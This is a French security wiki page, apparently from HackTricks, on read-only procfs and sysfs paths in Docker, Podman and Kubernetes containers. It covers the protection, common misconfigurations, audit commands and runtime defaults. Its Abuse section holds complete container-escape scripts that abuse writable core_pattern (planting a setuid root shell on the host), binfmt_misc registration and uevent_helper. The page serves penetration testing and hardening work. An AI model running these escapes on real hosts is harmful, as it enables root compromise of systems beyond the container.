# Chemins système en lecture seule

{{#include ../../../../banners/hacktricks-training.md}}

Les chemins système en lecture seule constituent une protection distincte des chemins masqués. Au lieu de masquer complètement un chemin, le runtime l'expose mais le monte en lecture seule. Ceci est courant pour certains emplacements procfs et sysfs où l'accès en lecture peut être acceptable ou nécessaire au fonctionnement, mais où les écritures seraient trop dangereuses.

Le but est simple : de nombreuses interfaces du noyau deviennent beaucoup plus dangereuses lorsqu'elles sont modifiables. Un montage en lecture seule n'élimine pas toute valeur de reconnaissance, mais empêche une charge de travail compromise de modifier les fichiers exposés au noyau sous-jacents via ce chemin.

## Fonctionnement

Les runtimes marquent fréquemment certaines parties de la vue proc/sys comme lecture seule. Selon le runtime et l'hôte, cela peut inclure des chemins tels que :

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La liste réelle varie, mais le modèle est le même : autoriser la visibilité lorsque nécessaire, refuser la mutation par défaut.

## Laboratoire

Inspectez la liste des chemins en lecture seule déclarés par Docker :
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspectez la vue montée proc/sys depuis l'intérieur du container :
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Security Impact

Les chemins système en lecture seule réduisent une grande classe d'abus ayant un impact sur l'hôte. Même lorsqu'un attaquant peut inspecter procfs ou sysfs, l'impossibilité d'y écrire supprime de nombreux vecteurs de modification directe impliquant les paramètres du noyau, les gestionnaires de plantage, les assistants de chargement de modules ou d'autres interfaces de contrôle. L'exposition n'est pas éliminée, mais la transition d'une divulgation d'information à une influence sur l'hôte devient plus difficile.

## Misconfigurations

Les principales erreurs sont de démasquer ou de remonter des chemins sensibles en lecture-écriture, d'exposer directement le contenu proc/sys de l'hôte via des bind mounts accessibles en écriture, ou d'utiliser des modes privilégiés qui contournent effectivement les valeurs par défaut d'exécution plus sûres. Dans Kubernetes, `procMount: Unmasked` et les workloads privilégiés vont souvent de pair avec une protection proc plus faible. Une autre erreur opérationnelle courante est de supposer que, parce que le runtime monte généralement ces chemins en lecture seule, tous les workloads héritent encore de ce comportement par défaut.

## Abuse

Si la protection est faible, commencez par rechercher des entrées proc/sys accessibles en écriture :
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Lorsque des entrées accessibles en écriture sont présentes, les chemins de suivi à forte valeur incluent :
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Ce que ces commandes peuvent révéler :

- Les entrées modifiables sous `/proc/sys` signifient souvent que le container peut modifier le host kernel behavior plutôt que simplement l'inspecter.
- `core_pattern` est particulièrement important car une valeur côté host modifiable peut être transformée en host code-execution path en provoquant le crash d'un processus après avoir défini un pipe handler.
- `modprobe` révèle l'helper utilisé par le kernel pour les flux liés au module-loading ; c'est une cible à forte valeur classique lorsqu'il est modifiable.
- `binfmt_misc` indique si l'enregistrement d'un interpréteur personnalisé est possible. Si l'enregistrement est modifiable, cela peut devenir un execution primitive au lieu d'être juste un information leak.
- `panic_on_oom` contrôle une décision du kernel à l'échelle du host et peut donc transformer une exhaustion de ressources en host denial of service.
- `uevent_helper` est un des exemples les plus clairs d'un sysfs helper path modifiable produisant de l'exécution dans le host-context.

Parmi les découvertes intéressantes figurent des proc knobs côté host modifiables ou des entrées sysfs qui auraient normalement dû être en lecture seule. À ce stade, la charge de travail est passée d'une vue container contrainte vers une influence significative sur le kernel.

### Exemple complet: `core_pattern` Host Escape

Si `/proc/sys/kernel/core_pattern` est modifiable depuis l'intérieur du container et pointe vers la vue du kernel du host, il peut être abusé pour exécuter une payload après un crash :
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si le chemin atteint réellement le noyau de l'hôte, le payload s'exécute sur l'hôte et laisse derrière lui un setuid shell.

### Exemple complet : enregistrement `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` est accessible en écriture, l'enregistrement d'un interpréteur personnalisé peut produire une exécution de code lorsque le fichier correspondant est exécuté :
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Sur un `binfmt_misc` exposé à l'hôte et accessible en écriture, cela permet l'exécution de code dans le chemin d'interpréteur déclenché par le noyau.

### Exemple complet : `uevent_helper`

Si `/sys/kernel/uevent_helper` est accessible en écriture, le noyau peut invoquer un helper situé sur le chemin de l'hôte lorsqu'un événement correspondant est déclenché :
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La raison pour laquelle cela est si dangereux est que le helper path est résolu du point de vue du système de fichiers de l'hôte plutôt que depuis un contexte container-only sécurisé.

## Vérifications

Ces vérifications déterminent si l'exposition de procfs/sysfs est en lecture seule là où c'est attendu et si la charge de travail peut encore modifier des interfaces sensibles du noyau.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Ce qui est intéressant ici :

- Une charge de travail durcie normale ne devrait exposer que très peu d'entrées /proc/sys modifiables.
- Les chemins /proc/sys accessibles en écriture sont souvent plus critiques que l'accès en lecture ordinaire.
- Si le runtime indique qu'un chemin est en lecture seule mais qu'il est modifiable en pratique, vérifiez attentivement la propagation des montages, les bind mounts et les paramètres de privilèges.

## Paramètres par défaut du runtime

| Runtime / platform | État par défaut | Comportement par défaut | Faiblesses manuelles courantes |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut | Docker définit une liste par défaut de chemins en lecture seule pour les entrées proc sensibles | exposing host proc/sys mounts, `--privileged` |
| Podman | Activé par défaut | Podman applique des chemins par défaut en lecture seule sauf si explicitement assoupli | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Hérite des paramètres du runtime | Utilise le modèle de chemins en lecture seule du runtime sous-jacent sauf si affaibli par les paramètres du Pod ou les montages host | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Valeur par défaut du runtime | S'appuie généralement sur les valeurs par défaut OCI/runtime | same as Kubernetes row; direct runtime config changes can weaken the behavior |

Le point clé est que les chemins système en lecture seule sont généralement présents par défaut au niveau du runtime, mais ils sont faciles à contourner avec des modes privilégiés ou des bind mounts depuis l'hôte.
